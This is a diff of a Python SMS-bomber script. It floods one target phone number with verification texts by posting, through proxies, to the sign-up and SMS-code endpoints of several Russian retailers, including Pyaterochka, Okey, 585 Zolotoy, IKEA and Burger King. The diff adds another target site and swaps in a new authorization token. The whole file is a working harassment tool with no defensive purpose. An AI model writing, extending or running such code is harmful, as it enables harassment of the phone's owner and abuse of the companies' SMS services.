@@ -27,7 +27,7 @@ headers = {
 def pyaterka():
     pPhone = "+7" + phone
     pyaterkaHeaders = headers
-    pyaterkaHeaders.update({"x-Authorization": "Tokena3133e4dd44f3c7fcaa98d7a9d1f73e44ab656d0", "Host": "5ka.ru",
+    pyaterkaHeaders.update({"x-Authorization": "Token5e2a3af0d29336f47fa82809d8c574c0ea842cb6", "Host": "5ka.ru",
                             "Origin": "https://5ka.ru"})
     p = requests.post("https://5ka.ru/api/v1/services/phones/add", headers=pyaterkaHeaders, json={"number": pPhone},
                       proxies=proxy)
@@ -52,13 +52,6 @@ def aptekaru():
     print(apt.status_code, "aptekaru")
     print(apt.json())
 
-#def bistrodengi():
-    #bisHeaders=headers
-    #bisHeaders.update({"Host":"bistrodengi.ru","Origin":"https://bistrodengi.ru","X-Requested-With":"XMLHttpRequest"})
-    #bisPhone="+7"+phone
-    #bis=requests.post("https://bistrodengi.ru/ajax/lead.php",headers=bisHeaders,json={"fio":none,"phone":bisPhone})
-
-
 def ikea():
     ikHeaders=headers
     ikHeaders.update({"Host":"ru.accounts.ikea.com","Origin":"https://ru.accounts.ikea.com"})
@@ -74,13 +67,6 @@ def burgerKing():
     if bk.status_code==200:
         print("Успешно отправлено "+"BurgerKing")
 
-def ostin():
-    osHeaders=headers
-    osHeaders.update({"origin":"https://ostin.com","referer":"https://ostin.com/","x-ts-ajax-request":"true","x-security-request":"required","accept-encoding":"gzip, deflate, br","accept-language":"ru-RU,ru;q=0.9","accept":"application/json, text/plain, */*","content-length":"41","content-type":"application/json;charset=UTF-8"})
-    osPhone="+7"+phone
-    os=requests.post("https://ostin.com/api/v2/front/request-code",headers=osHeaders,proxies=proxy,json={"phone":osPhone,"channel":"PUSH"})
-    print(os.status_code,"Ostin")
-
 def zolotoy585():
     zolHeaders=headers
     zolHeaders.update({"x-qa-company":"3e6efe10-defd-4983-94a1-c5a4d3cb3689","x-qa-region":"a93acc32-8ed4-48ed-b105-abd0eb856021","x-qa-client-type":"WEB"})
@@ -88,17 +74,27 @@ def zolotoy585():
     zol=requests.post("https://www.585zolotoy.ru/api/sms/send_code/",headers=zolHeaders,proxies=proxy,json={"phone":zolPhone})
     print(zol.status_code,"Zolotoy 585")
 
-def okay():
+def okey():
     okHeaders=headers
     okPhone= "7"+phone
     ok=requests.post("https://www.okmarket.ru/ajax/personal/register/",headers=okHeaders,proxies=proxy,params={"lang":"ru","phone":okPhone})
     print(ok.status_code,"Магазин Окей")
 
-okay()
+def pirogiNomerOdin():
+    pirHeaders=headers
+    pirHeaders.update({"Host":"api.01.hungrygator.ru","Origin":"https://piroginomerodin.ru"})
+    pirPhone="7"+phone
+    pir=requests.post("https://api.01.hungrygator.ru/web/auth/webotp",headers=pirHeaders,proxies=proxy,json={"userLogin":pirPhone,"fu":"bar"})
+    print(pir.status_code,"Пироги №1")
+
+
+
+pirogiNomerOdin()
+okey()
 pyaterka()
 karusel()
 aptekaru()
 ikea()
 burgerKing()
-#ostin()
-zolotoy585()
+
+
